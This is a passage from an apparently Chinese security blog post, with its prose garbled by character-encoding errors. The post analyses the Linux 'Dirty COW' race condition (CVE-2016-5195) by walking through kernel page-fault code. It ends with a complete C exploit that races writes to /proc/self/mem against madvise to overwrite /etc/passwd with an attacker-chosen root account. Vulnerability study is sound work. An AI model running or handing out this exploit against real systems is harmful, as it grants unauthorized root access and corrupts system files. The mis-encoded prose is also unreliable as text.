class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> fault_flags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* mlock all present pages, but do not fault in new pages */</span></span><br><span class="line">	<span class="keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="comment">/* For mm_populate(), just skip the stack guard page. */</span></span><br><span class="line">	<span class="keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;</span><br><span class="line">			(stack_guard_page_start(vma, address) ||</span><br><span class="line">			 stack_guard_page_end(vma, address + PAGE_SIZE)))</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">		fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">	<span class="keyword">if</span> (nonblocking)</span><br><span class="line">		fault_flags |= FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_NOWAIT)</span><br><span class="line">		fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;</span><br><span class="line">		VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);</span><br><span class="line">		fault_flags |= FAULT_FLAG_TRIED;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line">	<span class="keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; VM_FAULT_OOM)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))</span><br><span class="line">			<span class="keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		BUG();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tsk) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; VM_FAULT_MAJOR)</span><br><span class="line">			tsk-&gt;maj_flt++;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			tsk-&gt;min_flt++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nonblocking)</span><br><span class="line">			*nonblocking = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment">	 * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment">	 * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment">	 * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment">	 * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment">	 * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment">	 * reCOWed by userspace write).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ¬¡è¿›å…¥æ—¶ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªå¯å†™çš„å†…å­˜é¡µäº†ï¼Œå¹¶ä¸”è¿”å›å€¼ä¸º<code>VM_FAULT_WRITE</code>ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œåˆ°ä¸Šé¢çš„æœ€åä¸€æ®µï¼Œæ‰€ä»¥ä¼šæ¸…é™¤æ‰<code>flag</code>ä¸­çš„<code>FOLL_WRITE</code>ã€‚é‚£ä¹ˆåœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨<code>follow_page_pte</code>å‡½æ•°æ—¶åˆ™ä¼šè¿”å›æ­£å¸¸çš„å†…å­˜é¡µäº†ã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨åˆ†æä¹‹å‰ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹<code>madvise</code>ç³»ç»Ÿè°ƒç”¨ï¼Œ<code>madvise</code>ä¸€å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºåœ°å€ï¼Œç¬¬äºŒå‚æ•°ä¸ºèŒƒå›´ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºè¡Œä¸ºã€‚è€Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯å»ºè®®å†…æ ¸ï¼Œåœ¨ä» addr æŒ‡å®šçš„åœ°å€å¼€å§‹ï¼Œé•¿åº¦ç­‰äº len å‚æ•°å€¼çš„èŒƒå›´å†…ï¼Œè¯¥åŒºåŸŸçš„ç”¨æˆ·è™šæ‹Ÿå†…å­˜åº”éµå¾ªç‰¹å®šçš„ä½¿ç”¨æ¨¡å¼ã€‚å†…æ ¸ä½¿ç”¨è¿™äº›ä¿¡æ¯ä¼˜åŒ–ä¸æŒ‡å®šèŒƒå›´å…³è”çš„èµ„æºçš„å¤„ç†å’Œç»´æŠ¤è¿‡ç¨‹ã€‚è€Œå…¶ä¸­å­˜åœ¨ä¸€ä¸ª<code>MADV_DONTNEED</code>å‚æ•°æˆ‘æ‰€ç†è§£çš„å°±æ˜¯å»é™¤å¯¹åº”çš„è¡¨é¡¹ï¼Œå¹¶ä¸”è¢«å†…æ ¸æ ‡è®°ï¼Œåœ¨è¢«éœ€è¦æ—¶å¯ä»¥è¢«é‡æ–°ä½¿ç”¨ã€‚</p>
<h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">			- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">	pte_unmap(page_table);</span><br><span class="line">	<span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line">		<span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);</span><br><span class="line">	<span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†æ¬¡èšç„¦<code>do_fault</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸€æ¬¡æˆ‘ä»¬çš„flagså…¶å®æ˜¯æ²¡æœ‰<code>FAULT_FLAG_WRITE</code>æ ‡å¿—ä½çš„ï¼Œæ‰€ä»¥ä¼šç›´æ¥è°ƒç”¨<code>do_read_fault</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_read_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">	<span class="keyword">pte_t</span> *pte;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span></span><br><span class="line"><span class="comment">	 * if page by the offset is not ready to be mapped (cold cache or</span></span><br><span class="line"><span class="comment">	 * something).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">		do_fault_around(vma, address, pte, pgoff, flags);</span><br><span class="line">		<span class="keyword">if</span> (!pte_same(*pte, orig_pte))</span><br><span class="line">			<span class="keyword">goto</span> unlock_out;</span><br><span class="line">		pte_unmap_unlock(pte, ptl);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __do_fault(vma, address, pgoff, flags, <span class="literal">NULL</span>, &amp;fault_page);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">		pte_unmap_unlock(pte, ptl);</span><br><span class="line">		unlock_page(fault_page);</span><br><span class="line">		page_cache_release(fault_page);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">	do_set_pte(vma, address, fault_page, pte, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">	unlock_page(fault_page);</span><br><span class="line">unlock_out:</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„<code>do_set_pte(vma, address, fault_page, pte, false, false);</code>å‡½æ•°è°ƒç”¨ï¼Œåœ¨<code>do_cow_fault</code>å‡½æ•°ä¸­åŒæ ·å­˜åœ¨è¿™æ ·çš„è°ƒç”¨<code>do_set_pte(vma, address, new_page, pte, true, true);</code>ã€‚å¯ä»¥å‘ç°ç¬¬ä¸‰ä¸ªå‚æ•°ä¹Ÿå°±å†³å®šäº†åé¢å¯ä»¥è·å–åˆ°çš„é¡µé¢ï¼Œè€Œ<code>do_read_fault</code>è¿™é‡Œè·å–çš„ç›´æ¥å°±æ˜¯<code>fault_page</code>ï¼Œè¿™é‡Œå°±æ˜¯å¾ˆç®€å•ç²—æš´çš„å°†å…¶ç§»å‡º<code>page_cache</code>ï¼Œè¿™æ˜¯å› ä¸ºkernelåœ¨é¢å¯¹ä¸€ä¸ªè¯»è¯·æ±‚æ—¶ä¸ä¼šå¤§è´¹å‘¨ç« çš„å†å»åˆ›å»ºä¸€ä¸ª<code>dirty COW</code>é¡µã€‚</p>
<h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>ä½¿ç”¨ä¸¤ä¸ªçº¿ç¨‹è·‘ç«äº‰ï¼Œåœ¨ç¬¬ä¸€ä¸ªçº¿ç¨‹å®Œæˆä¸¤æ¬¡ç¼ºé¡µå¼‚å¸¸çš„æµç¨‹ä¹‹åï¼Œç¬¬äºŒä¸ªçº¿ç¨‹è°ƒç”¨<code>madvise()</code>ç³»ç»Ÿè°ƒç”¨å°†å†…å­˜é¡µè°ƒå‡ºï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªçº¿ç¨‹åœ¨å°è¯•ç¬¬ä¸‰æ¬¡è·å–å†…å­˜é¡µæ—¶ä¾¿æ— æ³•æ­£å¸¸è·å–åˆ°å¯è¯»çš„ç‰©ç†é¡µï¼Œæ­¤æ—¶ä¼šå†æ¬¡å‡ºå‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ¥ä¸‹æ¥ä¼šæœ‰ä¸€æ¬¡è¿›å…¥åˆ°<code>faultin_page()</code>å‡½æ•°ä¸­ï¼Œè€Œè¿™æ¬¡è¿”å›çš„å†…å­˜é¡µå…¶å®å°±æ˜¯<code>fault_page</code>ï¼Œå¹¶ä¸”è¿™ä¸ªå†…å­˜é¡µä¹Ÿæ˜¯ä¸å¯å†™çŠ¶æ€çš„ï¼Œä½†æ˜¯åœ¨ä¸Šé¢çš„flagä¸­ï¼Œæˆ‘ä»¬å·²ç»å»é™¤æ‰äº†<code>FOLL_WRITE</code>æ‰€ä»¥åœ¨å†…æ ¸çœ¼ä¸­ï¼Œè¿™æ˜¯ä¸€å—ç”¨æ¥è¯»çš„å†…å­˜é¡µï¼Œæ‰€ä»¥ä¼šæ­£å¸¸è¿”å›å¤„å†…å­˜é¡µï¼Œä½†æ˜¯åœ¨<code>access_remote_vm</code>ä¸­åˆ¤æ–­è¯»å†™ä½¿ç”¨çš„æ˜¯<code>write</code>å˜é‡ï¼Œæ‰€ä»¥å®é™…ä¸Šæˆ‘ä»¬ä¾æ—§æ˜¯åœ¨å¾€å†…éƒ¨è¿›è¡Œå†™ï¼Œè‡³æ­¤æˆåŠŸå®ç°äº†è¶Šæƒå†™ã€‚</p>
<h2 id="ç»¼ä¸Šï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šï¼Œå¯å¾—exp"></a>ç»¼ä¸Šï¼Œå¯å¾—exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">passwd_st</span>;</span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">char</span> *fake_user;</span><br><span class="line"><span class="keyword">int</span> fake_user_length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *username;</span><br><span class="line">    <span class="keyword">char</span> *hash;</span><br><span class="line">    <span class="keyword">int</span> user_id;</span><br><span class="line">    <span class="keyword">int</span> group_id;</span><br><span class="line">    <span class="keyword">char</span> *info;</span><br><span class="line">    <span class="keyword">char</span> *home_dir;</span><br><span class="line">    <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">info</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .user_id = <span class="number">0</span>,</span><br><span class="line">        .group_id = <span class="number">0</span>,</span><br><span class="line">        .info = <span class="string">&quot;196082&quot;</span>,</span><br><span class="line">        .home_dir = <span class="string">&quot;/root&quot;</span>,</span><br><span class="line">        .shell = <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="keyword">off_t</span>)<span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_user, fake_user_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> passwd_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./dirty username password&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do not forget to make a backup for the /etc/passwd by yourself&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info.username = argv[<span class="number">1</span>];</span><br><span class="line">    info.hash = crypt(argv[<span class="number">2</span>], argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    fake_user_length = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,</span><br><span class="line">                                info.username,</span><br><span class="line">                                info.hash,</span><br><span class="line">                                info.user_id,</span><br><span class="line">                                info.group_id,</span><br><span class="line">                                info.info,</span><br><span class="line">                                info.home_dir,</span><br><span class="line">                                info.shell);</span><br><span class="line">    fake_user = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(fake_user_length + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(fake_user, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,</span><br><span class="line">            info.username,</span><br><span class="line">            info.hash,</span><br><span class="line">            info.user_id,</span><br><span class="line">            info.group_id,</span><br><span class="line">            info.info,</span><br><span class="line">            info.home_dir,</span><br><span class="line">            info.shell);</span><br><span class="line"></span><br><span class="line">    passwd_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of /etc/passwd: %d\n&quot;</span>, passwd_fd);</span><br><span class="line"></span><br><span class="line">    fstat(passwd_fd, &amp;passwd_st);</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, passwd_st.st_size, PROT_READ, MAP_PRIVATE, passwd_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p>â€‹	<a class="link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/" >https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹	<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4/source" >https://elixir.bootlin.com/linux/v4.4/source<i class="fas fa-external-link-alt"></i></a></p>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/page-fault/">page fault</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/COW/">COW</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Race-condition/">Race condition</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2023/08/12/CVE-2021-3490/"
                                   title="CVE-2021-3490å¤ç°"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">CVE-2021-3490å¤ç°</span>
                                        <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2023/07/28/dl-runtime-resolve/"
                                   title="dl-runtime-resolveé‡æ¸©"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">dl-runtime-resolveé‡æ¸©</span>
                                        <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    


    <div class="comments-container border-box">
        <div id="comments-anchor" class="comment-area-title border-box">
            <i class="fas fa-comments"></i>&nbsp;è¯„è®º
        </div>
        <div class="comment-plugin-fail border-box">
    <span class="fail-tip">è¯„è®ºæ’ä»¶åŠ è½½å¤±è´¥</span>
    <button class="reload keep-button">ç‚¹å‡»é‡æ–°åŠ è½½</button>
</div>
<div class="comment-plugin-loading flex-center border-box">
    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
    <span class="load-tip">æ­£åœ¨åŠ è½½è¯„è®ºæ’ä»¶</span>
</div>
